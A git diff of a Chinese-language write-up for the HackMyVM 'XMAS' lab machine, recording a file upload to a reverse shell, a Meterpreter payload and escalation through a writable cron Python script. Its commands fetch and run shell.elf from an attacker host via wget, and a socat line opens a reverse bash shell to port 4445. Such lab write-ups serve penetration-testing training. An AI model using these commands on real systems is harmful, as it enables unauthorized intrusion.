@@ -3,7 +3,7 @@ title: XMAS
 tags:
   - sec/hackmyvm
 date: 2024-02-14T17:08:44
-lastmod: 2024-11-24T19:08:29
+lastmod: 2024-11-24T19:23:10
 toc: "true"
 ---
 ## 靶机, 启动
@@ -14,10 +14,12 @@ toc: "true"
 
 ![HMM_XMAS_image_1](https://img.l1uyun.one/HMM_XMAS_image_1.png)
 
+
 ![HMM_XMAS_image_2](https://img.l1uyun.one/HMM_XMAS_image_2.png)
 
 ## web 服务
 目录扫描
+
 ![HMM_XMAS_image_3](https://img.l1uyun.one/HMM_XMAS_image_3.png)
 
 在主页的下面发现了一个上传点, 直接上传反弹 shell
@@ -28,6 +30,7 @@ toc: "true"
 
 ![HMM_XMAS_image_5](https://img.l1uyun.one/HMM_XMAS_image_5.png)
 
+
 ![HMM_XMAS_image_6](https://img.l1uyun.one/HMM_XMAS_image_6.png)
 然后还是用了 meterpreter
 
@@ -37,8 +40,11 @@ wget http://192.168.10.11:8000/shell.elf -O /tmp/shell.elf&&chmod 777 /tmp/shell
 ## www-data ,进一步收集信息
 
 /home/alabaster/nice_list. txt
+
 ![HMM_XMAS_image_7](https://img.l1uyun.one/HMM_XMAS_image_7.png)
+
 这有个 python 代码,. 在 linpeas. sh 枚举之后发现是定时任务, 并且是可写的
+
 ![HMM_XMAS_image_8](https://img.l1uyun.one/HMM_XMAS_image_8.png)
 
 
@@ -50,13 +56,16 @@ echo 'import subprocess; subprocess.call(["/tmp/newshell.elf"])' > nice_or_naugh
 ```
 
 又是这样子不稳定的 shell
+
 ![HMM_XMAS_image_9](https://img.l1uyun.one/HMM_XMAS_image_9.png)
 
 上传一个 socat 二进制文件上去算了
+
 ```bash
 echo 'import subprocess; subprocess.call(["/tmp/socat", "TCP:192.168.10.11:4445", "EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"])' > nice_or_naughty.py
 ```
 还是不行
+
 ![HMM_XMAS_image_10](https://img.l1uyun.one/HMM_XMAS_image_10.png)
 ## User-alabaster
 巨魔大佬 nb
